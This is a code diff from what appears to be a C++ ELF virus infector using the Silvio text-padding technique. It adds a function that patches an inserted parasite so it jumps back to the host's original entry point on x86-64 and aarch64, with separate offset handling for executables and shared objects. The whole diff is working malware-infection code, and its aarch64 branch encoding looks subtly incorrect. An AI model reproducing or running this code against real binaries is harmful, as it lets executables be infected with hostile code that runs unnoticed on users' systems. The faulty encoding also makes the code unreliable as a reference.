@@ -108,6 +108,67 @@ Elf64_Addr patch_ehdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
   return original_entry_point;
 }
 
+bool patch_parasite_and_resume_control(
+    Elf64_Addr original_entry_point, size_t parasite_size,
+    vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
+    SilvioElfInfo& info) {
+#if defined(__x86_64__)
+  // For x86-64, patch the jmp address to the original entry point.
+  // It is assumed that the inserted virus has at least 8 bytes of noop and
+  // that's where it jumps back to host.
+  // jmp rel32 e9 xxxxxxxx The rel32 offset is from the next instruction after
+  // the jmp. The patched jump instruction is always 5 bytes.
+  auto cur = common::find<uint64_t>(host_mapping.base() + info.parasite_offset,
+                                    parasite_size, 0x9090909090909090);
+  if (cur == -1) {
+    printf("failed to patch host entry\n");
+    return false;
+  }
+  auto header = reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
+  int32_t rel = 0;
+  if (header->e_type == ET_EXEC) {
+    // for executables, the original entry is the load address, the parasite
+    // load address is the new memory address. Use that for offset calculation.
+    rel = original_entry_point - (info.parasite_load_address + cur + 5);
+  } else if (header->e_type == ET_DYN) {
+    // Both original and parasite offset are relative address to the process
+    // start, which is not known until runtime.
+    rel = original_entry_point - (info.parasite_offset + cur + 5);
+  } else {
+    CHECK_FAIL();
+  }
+  *(host_mapping.mutable_base() + info.parasite_offset + cur) = 0xe9;
+  *(int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur + 1) =
+      rel;
+#elif defined(__aarch64__)
+  // For aarch64, patch the b address to the orignal entry point.
+  // It is assumed that the inserted virus has at least 4 bytes of noop and
+  // that's where it jumps back to host.
+
+  // b imm26
+  // 000101 imm26
+  // imm26 = rel / 4
+  // The rel is offset from the current instruction (b xxx)
+  // The patched jump instruction is always 4 bytes.
+
+  auto cur = common::find<uint32_t>(host_mapping.base() + info.parasite_offset,
+                                   parasite_size, 0xd503201f);
+  if (cur == -1) {
+    printf("failed to patch host entry\n");
+    return false;
+  }
+  int32_t rel = original_entry_point - (info.parasite_offset + cur);
+  printf("original 0x%x\n", original_entry_point);
+  printf("cur jmp 0x%x\n", info.parasite_offset + cur);
+  printf("diff 0x%d\n", rel);
+
+  rel /= 4;
+  *(int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur) = rel;
+  *(host_mapping.mutable_base() + info.parasite_offset + cur) &= 0b101;
+#endif
+  return true;
+}
+
 // Returns gap size (accomodation for parasite code in padding between CODE
 // segment and next segment after CODE segment) padding size,
 // code_segment_end_offset, parasite_offset, parasite_load_address
@@ -177,12 +238,14 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // Get Home size (in bytes) of parasite residence in host
   // and check if host's home size can accomodate a parasite this big in size
   if (!get_info(host_mapping.base(), parasite_mapping.size(), info)) {
-    // printf("Cannot correctly parse host elf\n");
+    printf("Cannot correctly parse host elf\n");
     return false;
   }
 
   if (info.padding_size < parasite_mapping.size()) {
-    printf("[+] Host cannot accomodate parasite\n");
+    printf(
+        "Host cannot accomodate parasite padding size: %d parasite size: %d\n",
+        info.padding_size, parasite_mapping.size());
     return false;
   }
 
@@ -203,57 +266,8 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   memcpy(host_mapping.mutable_base() + info.parasite_offset,
          parasite_mapping.base(), parasite_mapping.size());
 
-  // TODO: generate this instruction dynamically.
-
-#if defined(__x86_64__)
-  // For x86-64, patch the jmp address to the original entry point.
-  // It is assumed that the inserted virus has at least 8 bytes of noop and
-  // that's where it jumps back to host.
-  // jmp rel32 e9 xxxxxxxx The rel32 offset is from the next instruction after
-  // the jmp. The patched jump instruction is always 5 bytes.
-  auto cur =
-      common::find<uint64_t>(host_mapping.base() + info.parasite_offset,
-                             parasite_mapping.size(), 0x9090909090909090);
-  if (cur == -1) {
-    printf("failed to patch host entry\n");
-    return false;
-  }
-  int32_t rel = original_entry_point - (info.parasite_offset + cur + 5);
-  printf("original 0x%x\n", original_entry_point);
-  printf("cur jmp 0x%x\n", info.parasite_offset + cur);
-  printf("diff 0x%d\n", rel);
-  *(host_mapping.mutable_base() + info.parasite_offset + cur) = 0xe9;
-  *(int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur + 1) =
-      rel;
-
-#elif defined(__aarch64__)
-  // For aarch64, patch the b address to the orignal entry point.
-  // It is assumed that the inserted virus has at least 4 bytes of noop and
-  // that's where it jumps back to host.
-
-  // b imm26
-  // 000101 imm26
-  // imm26 = rel / 4
-  // The rel is offset from the current instruction (b xxx)
-  // The patched jump instruction is always 4 bytes.
-
-  auto cur = common::find<uint32_t>(host_mapping.base() + info.parasite_offset,
-                                    parasite_mapping.size(), 0xd503201f);
-  if (cur == -1) {
-    printf("failed to patch host entry\n");
-    return false;
-  }
-  int32_t rel = original_entry_point - (info.parasite_offset + cur);
-  printf("original 0x%x\n", original_entry_point);
-  printf("cur jmp 0x%x\n", info.parasite_offset + cur);
-  printf("diff 0x%d\n", rel);
-
-  rel /= 4;
-  *(int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur) = rel;
-  *(host_mapping.mutable_base() + info.parasite_offset + cur) &= 0b101;
-#endif
-
-  return true;
+  return patch_parasite_and_resume_control(
+      original_entry_point, parasite_mapping.size(), host_mapping, info);
 }
 
 bool silvio_infect64(const char* host_path, const char* parasite_path) {
